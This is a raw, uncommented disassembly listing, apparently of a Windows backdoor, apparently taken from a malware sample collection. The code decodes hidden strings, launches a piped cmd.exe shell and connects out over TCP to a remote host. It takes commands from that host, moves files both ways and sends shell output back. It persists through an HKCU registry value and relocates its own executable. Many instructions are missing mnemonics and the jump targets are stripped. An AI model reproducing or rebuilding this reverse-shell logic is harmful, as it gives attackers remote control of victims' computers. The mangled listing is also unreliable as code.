sub_401000
mov edx [ esp + 0x4 ]
push esi
push edi
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov esi ecx
test esi esi
jle r-xdata
pop edi
mov eax edx
pop esi
retn
mov cl [ eax + edx ]
dec cl
xor cl 0x5
mov [ eax + edx ] cl
inc eax
cmp eax esi
jl r-xdata
sub_401030
mov eax 0x14d8
call sub_402600
push ebx
push ebp
push esi
push edi
xor ebx ebx
mov ecx 0x3ff
xor eax eax
lea edi [ esp + 0x4e9 ]
mov [ esp + 0x4e8 ] bl
mov [ esp + 0x2e0 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov eax [ rw-data ]
mov ecx 0x40
mov [ esp + 0xd8 ] eax
xor eax eax
lea edi [ esp + 0xdc ]
push 0x104
[ edi ]
mov ecx 0x40
lea edi [ esp + 0x2e5 ]
[ edi ]
stosw [ edi ]
lea ecx [ esp + 0x2e4 ]
push ecx
stosb [ edi ]
call [ GetSystemDirectoryA@IAT ]
lea edi [ esp + 0x14 ]
or ecx 0xffffffff
xor eax eax
mov [ esp + 0x14 ] 0x5c
mov [ esp + 0x15 ] 0x63
mov [ esp + 0x16 ] 0x6d
mov [ esp + 0x17 ] 0x64
mov [ esp + 0x18 ] 0x2e
mov [ esp + 0x19 ] 0x65
mov [ esp + 0x1a ] 0x78
mov [ esp + 0x1b ] 0x65
mov [ esp + 0x1c ] bl
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x2e0 ]
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
mov ebp [ esp + 0x14ec ]
and ecx 0x3
mov [ esp + 0x30 ] eax
[ edi ] [ esi ]
mov [ esp + 0x34 ] eax
mov ecx 0x11
mov [ esp + 0x38 ] eax
lea edi [ esp + 0x60 ]
mov [ esp + 0x3c ] eax
[ edi ]
mov esi [ CreatePipe@IAT ]
lea eax [ esp + 0x44 ]
push ebx
lea ecx [ esp + 0x2c ]
push eax
lea edx [ esp + 0x28 ]
push ecx
push edx
mov [ esp + 0x54 ] 0xc
mov [ esp + 0x58 ] ebx
mov [ esp + 0x5c ] 0x1
call esi
lea eax [ esp + 0x44 ]
push ebx
lea ecx [ esp + 0x28 ]
push eax
lea edx [ esp + 0x34 ]
push ecx
push edx
call esi
lea ecx [ esp + 0x30 ]
lea edx [ esp + 0x60 ]
mov eax [ esp + 0x2c ]
push ecx
push edx
mov esi [ CreateProcessA@IAT ]
mov [ esp + 0xa0 ] eax
mov eax [ esp + 0x30 ]
push ebx
push ebx
push ebx
mov [ esp + 0xb4 ] eax
mov [ esp + 0xb0 ] eax
push 0x1
push ebx
lea eax [ esp + 0xf4 ]
push ebx
push eax
push ebx
mov [ esp + 0xb4 ] 0x101
mov [ esp + 0xb8 ] bx
call esi
test eax eax
jne r-xdata
mov ecx [ esp + 0x20 ]
mov esi [ CloseHandle@IAT ]
push ecx
call esi
mov edx [ esp + 0x2c ]
push edx
call esi
mov eax [ esp + 0x28 ]
push eax
call esi
mov ecx [ esp + 0x24 ]
push ecx
call esi
push ebx
mov edx [ esp + 0x34 ]
push edx
call [ TerminateProcess@IAT ]
mov ecx ebp
call sub_401ab0
test eax eax
je r-xdata
lea ecx [ esp + 0x30 ]
lea edx [ esp + 0x60 ]
push ecx
push edx
push ebx
push ebx
push ebx
push 0x1
push ebx
lea eax [ esp + 0xf4 ]
push ebx
lea ecx [ esp + 0x300 ]
push eax
push ecx
call esi
test eax eax
jne r-xdata
cmp [ esp + 0x30 ] ebx
je r-xdata
mov eax [ esp + 0x20 ]
mov edi [ PeekNamedPipe@IAT ]
push ebx
lea ecx [ esp + 0x14 ]
push ebx
push ecx
lea edx [ esp + 0x4f4 ]
push 0x1000
push edx
push eax
call edi
xor esi esi
mov edx [ esp + 0x30 ]
mov esi [ CloseHandle@IAT ]
push edx
call esi
mov eax [ esp + 0x34 ]
push eax
call esi
mov edx [ esp + 0x20 ]
mov esi [ CloseHandle@IAT ]
push edx
call esi
mov eax [ esp + 0x2c ]
push eax
call esi
mov ecx [ esp + 0x28 ]
push ecx
call esi
mov edx [ esp + 0x24 ]
push edx
call esi
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x14d8
retn 0x4
mov ecx [ esp + 0x24 ]
lea eax [ esp + 0x10 ]
push ebx
push eax
push 0x6
push rw-data
push ecx
call [ WriteFile@IAT ]
mov ecx 0x400
jbe r-xdata
push 0x32
call [ Sleep@IAT ]
push ebx
lea ecx [ esp + 0x14 ]
mov eax [ esp + 0x24 ]
push ebx
push ecx
lea edx [ esp + 0x4f4 ]
push 0x1000
push edx
push eax
call edi
inc esi
cmp esi 0x14
jl r-xdata
xor eax eax
lea edi [ esp + 0x4e8 ]
[ edi ]
push ebx
lea eax [ esp + 0x4ec ]
push 0x1000
push eax
mov ecx ebp
call sub_401a30
cmp eax 0xffffffff
mov [ esp + 0x10 ] eax
je r-xdata
xor eax eax
lea edi [ esp + 0x4e8 ]
[ edi ]
mov eax [ esp + 0x20 ]
lea ecx [ esp + 0x10 ]
push ebx
push ecx
push edx
lea edx [ esp + 0x4f4 ]
push edx
push eax
call [ ReadFile@IAT ]
push ebx
lea edx [ esp + 0x4ec ]
mov ecx [ esp + 0x14 ]
push ecx
push edx
mov ecx ebp
call sub_4019e0
cmp eax 0xffffffff
je r-xdata
mov edx [ esp + 0x10 ]
cmp edx ebx
jne r-xdata
mov edx [ esp + 0x10 ]
cmp edx ebx
cmp [ esp + 0x4e8 ] 0x69
jne r-xdata
jmp r-xdata
lea ecx [ esp + 0x10 ]
push ebx
push ecx
push eax
mov eax [ esp + 0x30 ]
lea edx [ esp + 0x4f4 ]
push edx
push eax
call [ WriteFile@IAT ]
jmp r-xdata
cmp [ esp + 0x4e9 ] 0x69
jne r-xdata
cmp [ esp + 0x4ea ] 0x73
jne r-xdata
mov cl [ esp + 0x4eb ]
cmp cl 0x63
jne r-xdata
cmp cl 0x70
jne r-xdata
cmp [ esp + 0x4ec ] 0x6d
jne r-xdata
cmp cl 0x65
jne r-xdata
cmp [ esp + 0x4ec ] 0x75
jne r-xdata
cmp [ esp + 0x4ed ] 0x64
jne r-xdata
cmp cl 0x6b
jne r-xdata
cmp [ esp + 0x4ec ] 0x78
jne r-xdata
cmp [ esp + 0x4ed ] 0x74
jne r-xdata
cmp [ esp + 0x4ee ] 0x20
jne r-xdata
cmp [ esp + 0x4ec ] 0x69
jne r-xdata
cmp [ esp + 0x4ed ] 0x69
jne r-xdata
cmp [ esp + 0x4ee ] 0x20
jne r-xdata
xor eax eax
cmp [ esp + 0x4ed ] 0x6c
jne r-xdata
cmp [ esp + 0x4ee ] 0x74
je r-xdata
mov ecx 0xc
xor eax eax
lea edi [ esp + 0xa5 ]
mov [ esp + 0xa4 ] bl
[ edi ]
lea ecx [ esp + 0x40 ]
lea edx [ esp + 0x50 ]
stosb [ edi ]
mov eax [ ebp ]
push ecx
push edx
push eax
mov [ esp + 0x4c ] 0x10
call [ getpeername@IAT ]
mov ecx [ esp + 0x54 ]
push ecx
call [ inet_ntoa@IAT ]
mov edi eax
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xa4 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
xor ecx ecx
lea edi [ esp + 0x3e5 ]
mov [ esp + 0x15 ] ecx
mov [ esp + 0x3e4 ] bl
mov [ esp + 0x19 ] cl
mov ecx 0x40
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x1dd ]
mov [ esp + 0x1dc ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov [ esp + 0x14 ] bl
xor eax eax
lea ecx [ esp + 0x4ef ]
push rw-data
push ecx
mov [ esp + eax + 0x4f7 ] bl
call [ strstr@IAT ]
add esp 0x8
test eax eax
je r-xdata
cmp cl 0xd
je r-xdata
cmp [ esp + 0x4ee ] 0x6c
je r-xdata
mov eax [ esp + 0x30 ]
cmp eax ebx
je r-xdata
jmp r-xdata
mov [ esp + eax + 0x4ef ] bl
lea edi [ esp + 0x4ef ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x1dc ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
cmp cl 0xd
je r-xdata
lea ecx [ esp + 0x4ef ]
lea edx [ esp + 0xd8 ]
push ecx
push rw-data
push edx
call [ sprintf@IAT ]
add esp 0xc
jmp r-xdata
lea edi [ esp + 0x4ef ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xd8 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
inc eax
cmp eax 0x100
jl r-xdata
mov eax [ esp + 0x30 ]
cmp eax ebx
je r-xdata
push ebx
push eax
call [ TerminateProcess@IAT ]
mov ecx ebp
call sub_401a90
mov [ rw-data ] 0x1
jmp r-xdata
lea ecx [ esp + 0x1dc ]
push esi
lea edx [ esp + 0x18 ]
push ecx
push edx
call [ strncpy@IAT ]
lea edi [ esp + esi + 0x1e9 ]
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x3e4 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
inc esi
cmp esi 0x100
jl r-xdata
inc eax
cmp eax 0x100
jl r-xdata
cmp [ esp + 0x30 ] ebx
je r-xdata
mov cl [ esp + eax + 0x4ef ]
cmp cl 0xa
je r-xdata
jmp r-xdata
push ebx
push eax
call [ TerminateProcess@IAT ]
mov ecx ebp
call sub_401a90
mov [ rw-data ] 0x1
cmp [ esp + esi + 0x1dc ] 0x20
je r-xdata
jmp r-xdata
mov cl [ esp + eax + 0x4ef ]
cmp cl 0xa
je r-xdata
jmp r-xdata
lea ecx [ esp + 0x3e4 ]
lea edx [ esp + 0x14 ]
push ecx
push edx
call [ atoi@IAT ]
add esp 0x4
push eax
lea eax [ esp + 0xac ]
push eax
call sub_401ac0
add esp 0xc
jmp r-xdata
xor esi esi
sub_4016b0
sub esp 0x104
push edi
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x5 ]
mov [ esp + 0x4 ] 0x0
push 0x104
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ esp + 0x8 ]
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
mov ecx [ esp + 0x10c ]
push ecx
call sub_401700
add esp 0x4
pop edi
add esp 0x104
retn
sub_401700
sub esp 0x208
push edi
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x5 ]
mov [ esp + 0x4 ] 0x0
mov [ esp + 0x108 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x109 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ esp + 0x108 ]
push eax
push 0x104
call [ GetTempPathA@IAT ]
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0x108 ]
push ecx
push 0x0
push rw-data
push edx
call [ GetTempFileNameA@IAT ]
lea eax [ esp + 0x4 ]
push eax
call [ DeleteFileA@IAT ]
mov edx [ esp + 0x210 ]
lea ecx [ esp + 0x4 ]
push ecx
push edx
call [ MoveFileA@IAT ]
push 0x4
lea eax [ esp + 0x8 ]
push 0x0
push eax
call [ MoveFileExA@IAT ]
pop edi
add esp 0x208
retn
sub_4017c0
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x530
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi ecx
mov [ ebp - 0x540 ] esi
lea eax [ esi + 0x8 ]
push eax
push 0x2
call [ WSAStartup@IAT ]
mov [ ebp - 0x4 ] 0x0
push 0x0
push 0x0
push 0x0
push 0x6
mov ebx 0x1
push ebx
push 0x2
call [ WSASocketA@IAT ]
mov [ esi ] eax
or edi 0xffffffff
cmp eax edi
jne r-xdata
xor ecx ecx
mov [ ebp - 0x428 ] ecx
mov [ ebp - 0x424 ] ecx
mov [ ebp - 0x420 ] ecx
mov [ ebp - 0x41c ] ecx
mov [ ebp - 0x428 ] 0x2
push 0x50
call [ htons@IAT ]
mov [ ebp - 0x426 ] ax
mov edx [ ebp + 0x8 ]
push edx
push esi
call sub_401950
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x530 ] bl
push ebx
lea eax [ ebp - 0x530 ]
push eax
push 0x8
push 0xffff
mov ecx [ esi ]
push ecx
call [ setsockopt@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] edi
mov eax edi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push 0x10
lea edx [ ebp - 0x428 ]
push edx
mov eax [ esi ]
push eax
call [ connect@IAT ]
cmp eax edi
jne r-xdata
mov [ ebp - 0x53c ] ebx
mov [ ebp - 0x538 ] 0xea60
mov [ ebp - 0x534 ] 0x1388
push eax
push eax
lea edx [ ebp - 0x530 ]
push edx
push eax
push eax
push 0xc
lea eax [ ebp - 0x53c ]
push eax
push 0x98000004
mov ecx [ esi ]
push ecx
call [ WSAIoctl@IAT ]
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] edi
mov eax [ esi ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi ]
mov [ ebp - 0x4 ] edi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_401950
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
push eax
call [ gethostbyname@IAT ]
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ eax + 0xc ]
mov edx [ ecx ]
mov eax [ edx ]
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4019e0
push ecx
push ebx
mov ebx [ esp + 0x10 ]
push ebp
mov ebp [ esp + 0x10 ]
push esi
push edi
mov edi [ esp + 0x20 ]
mov esi ecx
mov [ esp + 0x10 ] 0x0
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn 0xc
mov ecx [ esp + 0x10 ]
cmp ecx 0x4
jne r-xdata
inc ecx
cmp ecx 0x5
mov [ esp + 0x10 ] ecx
jl r-xdata
mov [ esi + 0x4 ] 0x0
mov eax [ esi ]
push edi
push ebx
push ebp
push eax
call [ send@IAT ]
cmp eax 0xffffffff
jne r-xdata
sub_401a30
push ecx
push ebx
mov ebx [ esp + 0x10 ]
push ebp
mov ebp [ esp + 0x10 ]
push esi
push edi
mov edi [ esp + 0x20 ]
mov esi ecx
mov [ esp + 0x10 ] 0x0
mov ecx [ esp + 0x10 ]
cmp ecx 0x4
jne r-xdata
test eax eax
jne r-xdata
inc ecx
cmp ecx 0x5
mov [ esp + 0x10 ] ecx
jl r-xdata
mov [ esi + 0x4 ] 0x0
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn 0xc
mov eax [ esi ]
push edi
push ebx
push ebp
push eax
call [ recv@IAT ]
cmp eax 0xffffffff
je r-xdata
sub_401ac0
sub esp 0x1a0
push esi
push edi
mov ecx 0x63
xor eax eax
lea edi [ esp + 0x1a ]
mov [ esp + 0x18 ] 0x0
[ edi ]
stosw [ edi ]
lea eax [ esp + 0x18 ]
push eax
push 0x202
call WSAStartup
push 0x6
push 0x1
push 0x2
call socket
mov ecx [ esp + 0x1ac ]
mov esi eax
push ecx
mov [ esp + 0xc ] 0x2
call inet_addr
mov edx [ esp + 0x1b0 ]
mov [ esp + 0xc ] eax
push edx
call htons
mov [ esp + 0xa ] ax
lea eax [ esp + 0x8 ]
push 0x10
push eax
push esi
call connect
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esp + 0x1b4 ]
push ecx
push esi
call sub_401b90
add esp 0x8
test eax eax
jne r-xdata
push rw-data
call [ printf@IAT ]
add esp 0x4
pop edi
pop esi
add esp 0x1a0
retn
push rw-data
push rw-data
jmp r-xdata
call [ printf@IAT ]
add esp 0x4
push esi
call closesocket
call WSACleanup
pop edi
pop esi
add esp 0x1a0
retn
sub_401b90
sub esp 0x3c
push ebx
push ebp
push esi
mov cl 0x6c
push edi
mov edi [ esp + 0x50 ]
mov [ esp + 0x38 ] cl
mov [ esp + 0x28 ] cl
mov [ esp + 0x2a ] cl
mov [ esp + 0x2b ] cl
mov [ esp + 0x41 ] cl
mov al 0x65
mov bl 0x69
mov dl 0x6f
xor ecx ecx
cmp edi 0xffffffff
mov [ esp + 0x30 ] 0x43
mov [ esp + 0x31 ] 0x72
mov [ esp + 0x32 ] al
mov [ esp + 0x33 ] 0x61
mov [ esp + 0x34 ] 0x74
mov [ esp + 0x35 ] al
mov [ esp + 0x36 ] 0x46
mov [ esp + 0x37 ] bl
mov [ esp + 0x39 ] al
mov [ esp + 0x3a ] 0x0
mov [ esp + 0x24 ] 0x4c
mov [ esp + 0x25 ] dl
mov [ esp + 0x26 ] 0x63
mov [ esp + 0x27 ] 0x61
mov [ esp + 0x29 ] 0x41
mov [ esp + 0x2c ] dl
mov [ esp + 0x2d ] 0x63
mov [ esp + 0x2e ] 0x0
mov [ esp + 0x3c ] 0x53
mov [ esp + 0x3d ] al
mov [ esp + 0x3e ] 0x74
mov [ esp + 0x3f ] 0x46
mov [ esp + 0x40 ] bl
mov [ esp + 0x42 ] al
mov [ esp + 0x43 ] 0x50
mov [ esp + 0x44 ] dl
mov [ esp + 0x45 ] bl
mov [ esp + 0x46 ] 0x6e
mov [ esp + 0x47 ] 0x74
mov [ esp + 0x48 ] al
mov [ esp + 0x49 ] 0x72
mov [ esp + 0x4a ] 0x0
mov [ esp + 0x14 ] 0x52
mov [ esp + 0x15 ] 0x45
mov [ esp + 0x16 ] 0x41
mov [ esp + 0x17 ] 0x44
mov [ esp + 0x18 ] 0x59
mov [ esp + 0x19 ] 0x0
mov [ esp + 0x10 ] ecx
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x3c
retn
mov eax [ esp + 0x54 ]
cmp eax ecx
je r-xdata
push ecx
push ecx
push 0x4
push ecx
push 0x1
push 0x40000000
push eax
mov [ esp + 0x38 ] 0x5
mov [ esp + 0x3c ] ecx
call [ CreateFileA@IAT ]
mov ebp eax
cmp ebp 0xffffffff
jne r-xdata
mov ebx [ LocalAlloc@IAT ]
push 0x10c
push 0x40
call ebx
mov esi eax
test esi esi
jne r-xdata
lea eax [ esp + 0x30 ]
push eax
push edi
call sub_401f30
add esp 0x8
neg eax
pop edi
pop esi
sbb eax eax
pop ebp
neg eax
pop ebx
add esp 0x3c
retn
push 0x0
push ebp
call [ GetFileSize@IAT ]
push 0x1000
push 0x40
mov [ esp + 0x5c ] eax
call ebx
mov ebx eax
test ebx ebx
jne r-xdata
push ebp
call [ CloseHandle@IAT ]
lea ecx [ esp + 0x24 ]
jmp r-xdata
mov eax [ esp + 0x54 ]
push 0x0
push 0x0
push eax
push ebp
call [ SetFilePointer@IAT ]
cmp eax 0xffffffff
jne r-xdata
push esi
call [ LocalFree@IAT ]
push ebp
call [ CloseHandle@IAT ]
lea edx [ esp + 0x24 ]
push edx
push edi
call sub_401f30
add esp 0x8
neg eax
pop edi
pop esi
sbb eax eax
pop ebp
neg eax
pop ebx
add esp 0x3c
retn
push ecx
push edi
call sub_401f30
add esp 0x8
neg eax
pop edi
pop esi
sbb eax eax
pop ebp
neg eax
pop ebx
add esp 0x3c
retn
mov edx [ esp + 0x54 ]
lea eax [ esp + 0x14 ]
lea ecx [ esi + 0xc ]
push eax
push ecx
mov [ esi + 0x4 ] edx
mov [ esi ] 0x1
mov [ esi + 0x8 ] 0xcccc
call [ lstrcpyA@IAT ]
push 0x0
push 0x10c
push esi
push edi
call send
cmp eax 0xffffffff
je r-xdata
push esi
mov esi [ LocalFree@IAT ]
call esi
push ebx
call esi
push ebp
call [ CloseHandle@IAT ]
lea ecx [ esp + 0x3c ]
mov edi [ LocalFree@IAT ]
push ebx
call edi
push esi
call edi
push ebp
call [ CloseHandle@IAT ]
mov ecx 0x43
xor eax eax
mov edi esi
lea edx [ esp + 0x1c ]
[ edi ]
mov eax [ esp + 0x50 ]
push edx
push 0x10c
push esi
push eax
call sub_401eb0
add esp 0x10
cmp eax 0xffffffff
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov edi [ esi + 0x4 ]
mov edx [ esp + 0x54 ]
push esi
sub edi edx
call [ LocalFree@IAT ]
test edi edi
jle r-xdata
mov edi [ LocalFree@IAT ]
push ebx
call edi
push ebp
call [ CloseHandle@IAT ]
push esi
call edi
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x3c
retn
push ebp
call [ SetEndOfFile@IAT ]
push ebx
call [ LocalFree@IAT ]
mov edx [ esp + 0x50 ]
lea ecx [ esp + 0x1c ]
push ecx
push 0x1000
push ebx
push edx
call sub_401eb0
mov esi eax
add esp 0x10
test esi esi
jl r-xdata
push ebp
call [ CloseHandle@IAT ]
push ebx
call [ LocalFree@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x3c
retn
push rw-data
push rw-data
call [ LoadLibraryA@IAT ]
push eax
call [ GetProcAddress@IAT ]
lea ecx [ esp + 0x10 ]
push 0x0
push ecx
push esi
push ebx
push ebp
call eax
test eax eax
je r-xdata
push ebp
call [ CloseHandle@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x3c
retn
sub edi esi
test edi edi
jg r-xdata
sub_401eb0
sub esp 0x104
mov eax [ esp + 0x114 ]
push esi
mov esi [ esp + 0x10c ]
push edi
push eax
push 0x0
lea ecx [ esp + 0x10 ]
push 0x0
push ecx
push 0x0
mov [ esp + 0x20 ] esi
mov [ esp + 0x1c ] 0x1
call select
mov edi eax
test edi edi
jle r-xdata
mov eax edi
lea edx [ esp + 0x8 ]
push edx
push esi
call __WSAFDIsSet
test eax eax
je r-xdata
mov eax [ esp + 0x118 ]
mov ecx [ esp + 0x114 ]
push 0x0
push eax
push ecx
push esi
call recv
test eax eax
jge r-xdata
pop edi
pop esi
add esp 0x104
retn
pop edi
or eax 0xffffffff
pop esi
add esp 0x104
retn
sub_401f30
push ebx
mov ebx [ esp + 0x8 ]
push esi
cmp ebx 0xffffffff
push edi
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
mov edi [ esp + 0x14 ]
test edi edi
je r-xdata
push 0x10c
push 0x40
call [ LocalAlloc@IAT ]
mov esi eax
test esi esi
je r-xdata
push 0xff
lea eax [ esi + 0xc ]
push edi
push eax
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0xcccc
call [ lstrcpynA@IAT ]
push 0x0
push 0x10c
push esi
push ebx
call send
test eax eax
jl r-xdata
push esi
call [ LocalFree@IAT ]
pop edi
pop esi
mov eax 0x1
pop ebx
retn
sub_401fb0
sub esp 0x108
push ebx
push ebp
push esi
push edi
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x15 ]
mov [ esp + 0x14 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
xor ebp ebp
call sub_402170
mov ebx eax
push rw-data
neg ebx
sbb ebx ebx
lea eax [ esp + 0x18 ]
and ebx 0x100
push rw-data
push eax
add ebx 0xf003f
call [ sprintf@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x14 ]
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x10 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
push ebx
lea ecx [ esp + 0x1c ]
push ebp
push ecx
push 0x80000001
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
mov edx [ esp + 0x10 ]
push edx
call [ RegCloseKey@IAT ]
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
add esp 0x108
retn
mov ebp 0x1
sub_402070
sub esp 0x68
push edi
call sub_401fb0
test eax eax
jne r-xdata
pop edi
add esp 0x68
retn
mov ecx 0x18
lea edi [ esp + 0x9 ]
mov [ esp + 0x8 ] al
[ edi ]
stosw [ edi ]
stosb [ edi ]
call sub_402170
neg eax
sbb eax eax
lea ecx [ esp + 0x4 ]
and eax 0x100
push ecx
add eax 0xf003f
push eax
push 0x0
push rw-data
push 0x80000001
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
mov edi [ esp + 0x70 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
push esi
lea edx [ esp + 0xc ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov edx [ esp + 0x8 ]
and ecx 0x3
push 0x64
[ edi ] [ esi ]
lea ecx [ esp + 0x10 ]
push ecx
push 0x1
push 0x0
push rw-data
push edx
call [ RegSetValueExA@IAT ]
test eax eax
pop esi
jne r-xdata
mov eax [ esp + 0x4 ]
push eax
call [ RegCloseKey@IAT ]
sub_402120
push ecx
call sub_402170
neg eax
sbb eax eax
lea ecx [ esp ]
and al 0x0
push ecx
add eax 0xf023f
push eax
push 0x0
push rw-data
push 0x80000001
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
mov eax [ esp ]
push eax
call [ RegCloseKey@IAT ]
pop ecx
retn
mov edx [ esp ]
push rw-data
push edx
call [ RegDeleteValueA@IAT ]
sub_402170
sub esp 0x14
mov al 0x73
mov cl 0x6f
mov [ esp + 0x5 ] al
mov [ esp + 0x10 ] al
mov [ esp + 0x11 ] al
lea eax [ esp + 0x4 ]
push eax
push rw-data
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xc ] 0x49
mov [ esp + 0xe ] 0x57
mov [ esp + 0xf ] cl
mov [ esp + 0x10 ] 0x77
mov [ esp + 0x11 ] 0x36
mov [ esp + 0x12 ] 0x34
mov [ esp + 0x13 ] 0x50
mov [ esp + 0x14 ] 0x72
mov [ esp + 0x15 ] cl
mov [ esp + 0x16 ] 0x63
mov [ esp + 0x17 ] 0x65
mov [ esp + 0x1a ] 0x0
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
test eax eax
mov [ rw-data ] eax
je r-xdata
mov eax [ esp ]
add esp 0x14
retn
lea ecx [ esp ]
push ecx
call [ GetCurrentProcess@IAT ]
push eax
call [ rw-data ]
sub_402200
sub esp 0x2bc
push ebx
push ebp
push esi
push edi
call [ GetInputState@IAT ]
push 0x0
push 0x0
push 0x0
call [ GetCurrentThreadId@IAT ]
push eax
call [ PostThreadMessageA@IAT ]
push 0x0
push 0x0
lea eax [ esp + 0x1c ]
push 0x0
push eax
call [ GetMessageA@IAT ]
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x31 ]
mov [ esp + 0x30 ] 0x0
[ edi ]
stosw [ edi ]
lea ecx [ esp + 0x30 ]
push 0x104
push ecx
push 0x0
stosb [ edi ]
call [ GetModuleFileNameA@IAT ]
lea edx [ esp + 0x30 ]
push edx
call sub_402070
add esp 0x4
lea ecx [ esp + 0x134 ]
call sub_4017a0
mov al [ rw-data ]
xor esi esi
test al al
jne r-xdata
mov eax [ rw-data ]
push eax
call [ CloseHandle@IAT ]
lea ecx [ esp + 0x134 ]
call j_sub_401a90
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x2bc
retn 0x10
mov edi [ Sleep@IAT ]
mov ebp [ _beginthreadex@IAT ]
mov ebx [ WaitForSingleObject@IAT ]
push 0x1f4
call edi
inc esi
cmp esi 0x5
jbe r-xdata
lea ecx [ esp + 0x134 ]
call sub_401ab0
test eax eax
je r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov edx [ rw-data ]
xor esi esi
push edx
call edi
lea ecx [ esp + 0x10 ]
xor esi esi
push ecx
lea edx [ esp + 0x138 ]
push esi
push edx
push sub_402370
push esi
push esi
mov [ esp + 0x28 ] esi
call ebp
add esp 0x18
mov [ rw-data ] eax
push 0xffffffff
push eax
call ebx
mov al [ rw-data ]
test al al
jne r-xdata
mov eax [ esi * 4 + rw-data ]
push eax
call sub_401000
add esp 0x4
lea ecx [ esp + 0x134 ]
push eax
call sub_4017c0
cmp eax 0xffffffff
mov [ esp + 0x134 ] eax
je r-xdata
mov eax [ rw-data ]
push eax
call edi
mov ecx [ rw-data ]
push ecx
